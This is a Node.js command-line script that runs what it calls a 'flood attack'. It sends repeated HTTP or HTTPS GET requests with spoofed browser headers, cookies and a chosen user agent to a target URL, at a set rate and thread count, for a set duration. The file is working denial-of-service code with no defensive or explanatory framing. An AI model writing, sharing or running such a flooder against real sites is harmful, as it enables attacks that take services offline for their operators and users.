const http = require('http');
const https = require('https');
const url = require('url');
const { spawn } = require('child_process');

// Parse command line arguments
const targetURL = process.argv[2];
const duration = process.argv[3];
const threads = process.argv[4];
const proxy = process.argv[5];
const rates = process.argv[6];
const cookies = process.argv[7];
const userAgent = process.argv[8];

// Parse target URL
const parsedURL = url.parse(targetURL);
const protocol = parsedURL.protocol === 'https:' ? https : http;
const options = {
  hostname: parsedURL.hostname,
  port: parsedURL.port || (protocol === https ? 443 : 80),
  path: parsedURL.path,
  method: 'GET',
  headers: {
    'User-Agent': userAgent,
    'Cookie': cookies,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
  }
};

// Function to send a request
function sendRequest() {
  const req = protocol.request(options, (res) => {
    res.on('data', () => {});
    res.on('end', () => {
      console.log(`Request sent to ${targetURL}`);
    });
  });

  req.on('error', (err) => {
    console.error(`Error sending request: ${err.message}`);
  });

  req.end();
}

// Function to start flooding
function startFlood() {
  console.log(`Starting flood attack on ${targetURL} with ${threads} threads...`);
  for (let i = 0; i < threads; i++) {
    setInterval(sendRequest, rates);
  }
}

// Start the flood attack
startFlood();

// Stop the flood attack after the specified duration
setTimeout(() => {
  console.log(`Flood attack finished after ${duration} seconds.`);
  process.exit(0);
}, duration * 1000);